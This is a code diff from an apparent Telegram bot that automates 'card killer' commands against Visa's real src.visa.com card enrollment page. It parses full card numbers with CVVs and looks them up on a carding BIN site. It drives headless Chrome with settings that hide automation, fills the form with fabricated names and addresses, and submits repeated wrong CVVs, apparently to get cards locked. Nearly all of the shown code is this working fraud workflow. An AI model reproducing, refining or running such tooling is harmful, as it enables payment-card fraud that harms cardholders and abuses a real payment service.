@@ -178,7 +178,231 @@ def safe_driver_quit(driver):
             driver = None
             periodic_cleanup()
 
-# ==== 2.2 Browser Command Health Tracking ====
+# ==== 2.2 Shared Killer Process Utilities ====
+# Pre-computed constants for faster process startup
+_KILLER_CHROME_ARGS = [
+    "--headless=new",
+    "--no-sandbox",
+    "--disable-dev-shm-usage",
+    "--disable-gpu",
+    "--disable-extensions",
+    "--disable-software-rasterizer",
+    "--disable-background-networking",
+    "--disable-default-apps",
+    "--disable-sync",
+    "--disable-translate",
+    "--disable-hang-monitor",
+    "--disable-popup-blocking",
+    "--disable-prompt-on-repost",
+    "--disable-notifications",
+    "--disable-background-timer-throttling",
+    "--disable-renderer-backgrounding",
+    "--disable-backgrounding-occluded-windows",
+    "--disable-ipc-flooding-protection",
+    "--disable-component-update",
+    "--no-first-run",
+    "--window-size=1920,1080",
+    "--disable-blink-features=AutomationControlled",
+]
+
+_FAKE_FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
+_FAKE_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+_FAKE_ADDRESSES = [
+    ("123 Elm Street", "New York", "NY", "10001"),
+    ("456 Oak Avenue", "Los Angeles", "CA", "90001"),
+    ("789 Pine Road", "Chicago", "IL", "60601"),
+    ("321 Maple Drive", "Houston", "TX", "77001"),
+    ("654 Cedar Lane", "Phoenix", "AZ", "85001"),
+]
+
+# BIN cache for processes (shared via file for multiprocessing)
+_process_bin_cache = {}
+_process_bin_cache_lock = threading.Lock()
+
+def get_cached_bin_info(bin_number: str) -> tuple:
+    """Get BIN info with in-memory caching for processes"""
+    global _process_bin_cache
+    
+    if bin_number in _process_bin_cache:
+        return _process_bin_cache[bin_number]
+    
+    try:
+        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
+        if res.status_code == 200:
+            data = res.json()
+            brand = data.get("brand", "Unknown").upper()
+            type_ = data.get("type", "Unknown").upper()
+            country = data.get("country_name", "Unknown")
+            country_code = data.get("country", "") or data.get("country_code", "")
+            
+            # Generate flag
+            flag = ""
+            if country_code and len(country_code) == 2:
+                try:
+                    flag = "".join(chr(ord(c) + 127397) for c in country_code.upper())
+                except:
+                    flag = data.get("country_flag", "")
+            else:
+                flag = data.get("country_flag", "")
+            
+            bank = data.get("bank", "Unknown")
+            level = data.get("level", "")
+            
+            info_parts = [brand]
+            if type_ and type_ != "UNKNOWN":
+                info_parts.append(type_)
+            if country and country != "Unknown":
+                info_parts.append(country)
+            if level:
+                info_parts.append(level)
+            if bank and bank != "Unknown":
+                info_parts.append(bank)
+            
+            result = (" • ".join(info_parts), flag)
+            
+            with _process_bin_cache_lock:
+                if len(_process_bin_cache) < 1000:  # Limit cache size
+                    _process_bin_cache[bin_number] = result
+            
+            return result
+    except:
+        pass
+    
+    return ("Unavailable", "")
+
+def create_killer_driver():
+    """Create optimized Chrome driver for killer commands - consistent across all uses"""
+    from selenium import webdriver
+    from selenium.webdriver.chrome.service import Service
+    from fake_useragent import UserAgent
+    
+    options = webdriver.ChromeOptions()
+    options.binary_location = "/usr/bin/google-chrome"
+    
+    try:
+        ua = UserAgent(fallback="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").random
+    except:
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    
+    options.add_argument(f"user-agent={ua}")
+    
+    for arg in _KILLER_CHROME_ARGS:
+        options.add_argument(arg)
+    
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    options.set_capability("pageLoadStrategy", "eager")
+    
+    service = Service(executable_path="/usr/bin/chromedriver")
+    driver = webdriver.Chrome(service=service, options=options)
+    driver.set_page_load_timeout(25)
+    
+    return driver
+
+def killer_split_card(card_input: str) -> tuple:
+    """Split card input into components"""
+    parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
+    if len(parts) != 4:
+        raise ValueError("Invalid card format")
+    return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
+
+def killer_get_fake_identity() -> dict:
+    """Get random fake identity for forms"""
+    import random
+    first = random.choice(_FAKE_FIRST_NAMES)
+    last = random.choice(_FAKE_LAST_NAMES)
+    addr = random.choice(_FAKE_ADDRESSES)
+    phone = "202555" + ''.join(random.choices('0123456789', k=4))
+    email = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)) + "@gmail.com"
+    
+    return {
+        "first_name": first,
+        "last_name": last,
+        "address": addr[0],
+        "city": addr[1],
+        "state": addr[2],
+        "zip": addr[3],
+        "phone": phone,
+        "email": email
+    }
+
+def killer_get_wrong_cvv(exclude: str) -> str:
+    """Generate a random CVV that's not the real one"""
+    import random
+    while True:
+        fake = ''.join(random.choices('0123456789', k=len(exclude)))
+        if fake != exclude:
+            return fake
+
+def killer_edit_message(update_dict: dict, text: str):
+    """Edit telegram message - optimized with timeout"""
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{os.environ.get('BOT_TOKEN', '')}/editMessageText",
+            data={
+                "chat_id": update_dict["chat_id"],
+                "message_id": update_dict["message_id"],
+                "text": text,
+                "parse_mode": "Markdown"
+            },
+            timeout=5
+        )
+    except:
+        pass
+
+def killer_admin_report(cmd_name: str, trace: str, driver=None):
+    """Send error report to admin"""
+    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+    BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))
+    
+    sent = False
+    if driver:
+        try:
+            screenshot_path = f"/tmp/{cmd_name}_fail_{int(time.time())}.png"
+            driver.save_screenshot(screenshot_path)
+            with open(screenshot_path, "rb") as img:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                    data={
+                        "chat_id": BOT_ADMIN_ID,
+                        "caption": f"{cmd_name.upper()} Error:\n```\n{trace[:800]}\n```",
+                        "parse_mode": "Markdown"
+                    },
+                    files={"photo": img},
+                    timeout=10
+                )
+            sent = True
+            try:
+                os.remove(screenshot_path)
+            except:
+                pass
+        except:
+            pass
+    
+    if not sent:
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                data={
+                    "chat_id": BOT_ADMIN_ID,
+                    "text": f"{cmd_name.upper()} Error:\n```\n{trace[:900]}\n```",
+                    "parse_mode": "Markdown"
+                },
+                timeout=5
+            )
+        except:
+            pass
+
+def killer_cleanup_driver(driver):
+    """Clean up driver properly"""
+    if driver:
+        try:
+            driver.quit()
+        except:
+            pass
+    gc.collect()
+
+# ==== 2.3 Browser Command Health Tracking ====
 BROWSER_CMDS = ("kill", "kd", "ko", "zz", "dd", "st", "bt", "chk")
 _health_lock = threading.Lock()
 _health_stats = {cmd: {"success": 0, "failure": 0, "last_status": "idle", "last_time": None} for cmd in BROWSER_CMDS}
@@ -3329,241 +3553,82 @@ async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ==== 6. /kd Command (VISA Killer #2) ==== #
 def run_kd_process(card_input, update_dict):
-    import os, random, traceback, requests, time
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
+    """VISA Killer #2 - OPTIMIZED for consistent speed"""
+    import random, traceback, time, gc
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.common.keys import Keys
-    from fake_useragent import UserAgent
-
-    CHROME_PATH = "/usr/bin/google-chrome"
-    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
-    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
-    def _env_int(name: str, default: int) -> int:
-        raw = os.environ.get(name)
-        if raw is None or str(raw).strip() == "":
-            return default
-        try:
-            return int(str(raw).strip())
-        except Exception:
-            return default
-
-    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def _flag_from_country_code(code: str) -> str:
-        code = (code or "").strip().upper()
-        if len(code) != 2 or not code.isalpha():
-            return ""
-        try:
-            return "".join(chr(ord(c) + 127397) for c in code)
-        except Exception:
-            return ""
-
-    def split_card(card_input):
-        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
-        if len(parts) != 4:
-            raise ValueError("Invalid card format")
-        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
-
-    def get_bin_info_local(bin_number):
-        try:
-            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-            if res.status_code == 200:
-                data = res.json()
-                brand = data.get("brand", "Unknown").upper()
-                type_ = data.get("type", "Unknown").upper()
-                country = data.get("country_name", "Unknown")
-                country_code = data.get("country", "") or data.get("country_code", "")
-                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
-                bank = data.get("bank", "Unknown")
-                level = data.get("level", "")
-                
-                info_parts = [brand]
-                if type_ and type_ != "UNKNOWN": 
-                    info_parts.append(type_)
-                if country and country != "Unknown":
-                    info_parts.append(country)
-                if level and level != "":
-                    info_parts.append(level)
-                if bank and bank != "Unknown":
-                    info_parts.append(bank)
-                    
-                return " • ".join(info_parts), country_flag
-        except:
-            pass
-        return "Unavailable", ""
-
-    def get_random_email():
-        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
-
-    def get_fake_name():
-        first = random.choice(["James", "John", "Robert", "Michael", "David"])
-        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        return first, last
-
-    def get_fake_address():
-        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
-
-    def get_wrong_cvv(exclude):
-        while True:
-            fake = ''.join(random.choices('0123456789', k=3))
-            if fake != exclude:
-                return fake
-
-    def edit_message(text):
-        payload = {
-            "chat_id": update_dict["chat_id"],
-            "message_id": update_dict["message_id"],
-            "text": text,
-            "parse_mode": "Markdown"
-        }
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        try:
-            requests.post(url, data=payload, timeout=8)
-        except Exception:
-            pass
-
-    def admin_report(trace, driver=None):
-        sent = False
-        screenshot_path = "kd_fail.png"
-        if driver:
-            try:
-                driver.save_screenshot(screenshot_path)
-                with open(screenshot_path, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"KD Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=12
-                    )
-                sent = True
-                os.remove(screenshot_path)
-            except Exception:
-                pass
-        if not sent:
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"KD Error (no screenshot):\n```\n{trace[:900]}\n```",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
-                    timeout=8
-                )
-            except Exception:
-                pass
 
     start = time.time()
     driver = None
 
     try:
-        # Optimized Chrome options for Railway
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_argument("--disable-software-rasterizer")
-        options.add_argument("--disable-background-networking")
-        options.add_argument("--disable-default-apps")
-        options.add_argument("--disable-sync")
-        options.add_argument("--no-first-run")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        options.set_capability("pageLoadStrategy", "eager")
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(20)
+        driver = create_killer_driver()
         wait = WebDriverWait(driver, 4)
 
-        # Step 1: Login
         driver.get("https://src.visa.com/login")
 
         try:
             btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
             driver.execute_script("arguments[0].click();", btn)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        identity = killer_get_fake_identity()
+        
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
 
-        edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
+        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
 
-        cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        cc, mm, yy, real_cvv = killer_split_card(card_input)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
-        wrong_cvv = get_wrong_cvv(real_cvv)
+        wrong_cvv = killer_get_wrong_cvv(real_cvv)
 
         wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill (in progress)...\n🔒 4 - CVV Try")
+        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill...\n🔒 4 - CVV Try")
 
-        # Step 3: Billing Fill
-        first_name, last_name = get_fake_name()
-        address, city, state, zip_code, phone = get_fake_address()
-
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
         try:
-            country_box = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
-            )
-            country_val = country_box.get_attribute('value')
-            if not country_val or ("United States" not in country_val):
+            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            country_val = country_box.get_attribute('value') or ""
+            if "United States" not in country_val:
                 country_box.click()
                 country_box.clear()
                 country_box.send_keys("United States")
-                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                 country_box.send_keys(Keys.ENTER)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(identity["phone"])
 
         add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
         driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
         add_card_btn.click()
 
-        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n🔓 3 - Billing Fill (Unlocked)\n⚙️ 4 - CVV Try (in progress)...")
+        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n🔓 3 - Billing Fill\n⚙️ 4 - CVV Try...")
 
-        # Step 4: CVV Attempts
-        cvv_results = []
-        used_cvvs = set()
-        used_cvvs.add(wrong_cvv)
-        cvv_results.append(wrong_cvv)
-        for i in range(7):
-            while True:
-                fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+        # CVV Attempts (8 total)
+        cvv_results = [wrong_cvv]
+        used_cvvs = {wrong_cvv}
+        for _ in range(7):
+            fake_cvv = killer_get_wrong_cvv(real_cvv)
+            while fake_cvv in used_cvvs:
+                fake_cvv = killer_get_wrong_cvv(real_cvv)
+            used_cvvs.add(fake_cvv)
             try:
                 add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
@@ -3573,12 +3638,12 @@ def run_kd_process(card_input, update_dict):
                 driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                 add_card_btn.click()
                 cvv_results.append(fake_cvv)
-            except Exception:
+            except:
                 cvv_results.append("Failed")
 
         duration = round(time.time() - start, 2)
         tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
-        edit_message(
+        killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
             f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
@@ -3589,15 +3654,11 @@ def run_kd_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-        edit_message(f"❌ KD Error: `{e}`")
-        admin_report(trace, driver)
+        killer_edit_message(update_dict, f"❌ KD Error: `{e}`")
+        killer_admin_report("kd", trace, driver)
         record_cmd_failure("kd")
     finally:
-        try:
-            if driver: driver.quit()
-        except: pass
-        driver = None
-        gc.collect()
+        killer_cleanup_driver(driver)
 
 async def kd_cmd(update, context):
     uid = update.effective_user.id
@@ -3625,241 +3686,82 @@ async def kd_cmd(update, context):
 
 # ==== 7. /ko Command (KO Mode, All Wait, No Sleep, USA) ==== #
 def run_ko_process(card_input, update_dict):
-    import os, random, traceback, requests, time
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
+    """VISA Killer #3 (KO Mode) - OPTIMIZED for consistent speed"""
+    import random, traceback, time, gc
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.common.keys import Keys
-    from fake_useragent import UserAgent
-
-    CHROME_PATH = "/usr/bin/google-chrome"
-    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
-    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
-    def _env_int(name: str, default: int) -> int:
-        raw = os.environ.get(name)
-        if raw is None or str(raw).strip() == "":
-            return default
-        try:
-            return int(str(raw).strip())
-        except Exception:
-            return default
-
-    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def _flag_from_country_code(code: str) -> str:
-        code = (code or "").strip().upper()
-        if len(code) != 2 or not code.isalpha():
-            return ""
-        try:
-            return "".join(chr(ord(c) + 127397) for c in code)
-        except Exception:
-            return ""
-
-    def split_card(card_input):
-        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
-        if len(parts) != 4:
-            raise ValueError("Invalid card format")
-        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
-
-    def get_bin_info_local(bin_number):
-        try:
-            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-            if res.status_code == 200:
-                data = res.json()
-                brand = data.get("brand", "Unknown").upper()
-                type_ = data.get("type", "Unknown").upper()
-                country = data.get("country_name", "Unknown")
-                country_code = data.get("country", "") or data.get("country_code", "")
-                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
-                bank = data.get("bank", "Unknown")
-                level = data.get("level", "")
-                
-                info_parts = [brand]
-                if type_ and type_ != "UNKNOWN": 
-                    info_parts.append(type_)
-                if country and country != "Unknown":
-                    info_parts.append(country)
-                if level and level != "":
-                    info_parts.append(level)
-                if bank and bank != "Unknown":
-                    info_parts.append(bank)
-                    
-                return " • ".join(info_parts), country_flag
-        except:
-            pass
-        return "Unavailable", ""
-
-    def get_random_email():
-        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
-
-    def get_fake_name():
-        first = random.choice(["James", "John", "Robert", "Michael", "David"])
-        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        return first, last
-
-    def get_fake_address():
-        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
-
-    def get_wrong_cvv(exclude):
-        while True:
-            fake = ''.join(random.choices('0123456789', k=3))
-            if fake != exclude:
-                return fake
-
-    def edit_message(text):
-        payload = {
-            "chat_id": update_dict["chat_id"],
-            "message_id": update_dict["message_id"],
-            "text": text,
-            "parse_mode": "Markdown"
-        }
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        try:
-            requests.post(url, data=payload, timeout=8)
-        except Exception:
-            pass
-
-    def admin_report(trace, driver=None):
-        sent = False
-        screenshot_path = "ko_fail.png"
-        if driver:
-            try:
-                driver.save_screenshot(screenshot_path)
-                with open(screenshot_path, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"KO Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=12
-                    )
-                sent = True
-                os.remove(screenshot_path)
-            except Exception:
-                pass
-        if not sent:
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"KO Error (no screenshot):\n```\n{trace[:900]}\n```",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
-                    timeout=8
-                )
-            except Exception:
-                pass
 
     start = time.time()
     driver = None
 
     try:
-        # Optimized Chrome options for Railway
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_argument("--disable-software-rasterizer")
-        options.add_argument("--disable-background-networking")
-        options.add_argument("--disable-default-apps")
-        options.add_argument("--disable-sync")
-        options.add_argument("--no-first-run")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        options.set_capability("pageLoadStrategy", "eager")
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(20)
+        driver = create_killer_driver()
         wait = WebDriverWait(driver, 4)
 
-        # Step 1: Login
         driver.get("https://src.visa.com/login")
 
         try:
             btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
             driver.execute_script("arguments[0].click();", btn)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        identity = killer_get_fake_identity()
+        
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
         wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
 
-        edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
+        killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
 
-        cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        cc, mm, yy, real_cvv = killer_split_card(card_input)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
-        wrong_cvv = get_wrong_cvv(real_cvv)
+        wrong_cvv = killer_get_wrong_cvv(real_cvv)
 
         wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
         wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
 
-        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill (in progress)...\n🔒 4 - CVV Try")
+        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n⚙️ 3 - Billing Fill...\n🔒 4 - CVV Try")
 
-        # Step 3: Billing Fill (always USA)
-        first_name, last_name = get_fake_name()
-        address, city, state, zip_code, phone = get_fake_address()
-
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])
 
         try:
-            country_box = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
-            )
-            country_val = country_box.get_attribute('value')
-            if not country_val or ("United States" not in country_val):
+            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
+            country_val = country_box.get_attribute('value') or ""
+            if "United States" not in country_val:
                 country_box.click()
                 country_box.clear()
                 country_box.send_keys("United States")
-                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                 country_box.send_keys(Keys.ENTER)
-        except Exception:
+        except:
             pass
 
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(identity["phone"])
 
         add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
         driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
         add_card_btn.click()
 
-        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n🔓 3 - Billing Fill (Unlocked)\n⚙️ 4 - CVV Try (in progress)...")
+        killer_edit_message(update_dict, "🔓 1 - Login\n🔓 2 - Card Fill\n🔓 3 - Billing Fill\n⚙️ 4 - CVV Try...")
 
-        # Step 4: CVV Attempts (6 tries for /ko)
-        cvv_results = []
-        used_cvvs = set()
-        used_cvvs.add(wrong_cvv)
-        cvv_results.append(wrong_cvv)
-        for i in range(6):
-            while True:
-                fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+        # CVV Attempts (7 total)
+        cvv_results = [wrong_cvv]
+        used_cvvs = {wrong_cvv}
+        for _ in range(6):
+            fake_cvv = killer_get_wrong_cvv(real_cvv)
+            while fake_cvv in used_cvvs:
+                fake_cvv = killer_get_wrong_cvv(real_cvv)
+            used_cvvs.add(fake_cvv)
             try:
                 add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                 cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
@@ -3869,12 +3771,12 @@ def run_ko_process(card_input, update_dict):
                 driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                 add_card_btn.click()
                 cvv_results.append(fake_cvv)
-            except Exception:
+            except:
                 cvv_results.append("Failed")
 
         duration = round(time.time() - start, 2)
